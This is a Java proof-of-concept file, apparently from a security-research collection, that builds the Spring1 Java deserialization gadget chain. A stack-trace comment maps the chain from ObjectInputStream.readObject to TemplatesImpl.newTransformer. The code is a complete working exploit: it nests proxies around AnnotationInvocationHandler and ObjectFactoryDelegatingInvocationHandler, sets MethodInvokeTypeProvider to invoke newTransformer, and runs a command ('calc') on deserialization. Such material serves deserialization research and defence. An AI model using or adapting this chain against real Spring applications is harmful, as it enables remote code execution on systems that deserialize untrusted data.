package com.javasec.pocs.spring;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;

/**
 * spring1 4.14
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [3]
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invoke:307, AutowireUtils$ObjectFactoryDelegatingInvocationHandler (org.springframework.beans.factory.support)
 * newTransformer:-1, $Proxy1 (com.sun.proxy)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [2]
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeMethod:202, ReflectionUtils (org.springframework.util)
 * invokeMethod:187, ReflectionUtils (org.springframework.util)
 * readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider (org.springframework.core)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [1]
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * main:36, spring1 (com.javasec.pocs.spring)
 */
public class spring1 {
    public static void main(String[] args) throws Exception{
        Templates tmpl = SerializeUtils.getTemplate("calc");
        HashMap<String, Object> map = new HashMap<>();
        map.put("getObject", tmpl);
        //代理1,getObject->templates
        InvocationHandler invocationHandler = (InvocationHandler) SerializeUtils.newInstance("sun.reflect.annotation.AnnotationInvocationHandler", Target.class, map);
        ObjectFactory factory = SerializeUtils.createProxy(invocationHandler, ObjectFactory.class);
        InvocationHandler ofdHandler = (InvocationHandler) SerializeUtils.newInstance("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler",factory);
        //代理2 typeTemplateProxy
        Type typeTemplateProxy = SerializeUtils.createProxy(ofdHandler, Type.class, Templates.class);
        HashMap<String, Object> map2 = new HashMap<>();
        map2.put("getType", typeTemplateProxy);
        //代理3 getType->typeTemplateProxy
        InvocationHandler newInvocationHandler = (InvocationHandler) SerializeUtils.newInstance("sun.reflect.annotation.AnnotationInvocationHandler", Target.class, map2);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        Object typeProviderProxy = SerializeUtils.createProxy(newInvocationHandler, typeProviderClass);
        //入口点 ReflectionUtils.invokeMethod->getType
        Object payload = SerializeUtils.newInstance("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider", typeProviderProxy, Object.class.getMethod("toString"), 0);
        SerializeUtils.setFieldValue(payload,"methodName","newTransformer");
        SerializeUtils.base64deserial(SerializeUtils.base64serial(payload));
    }
}
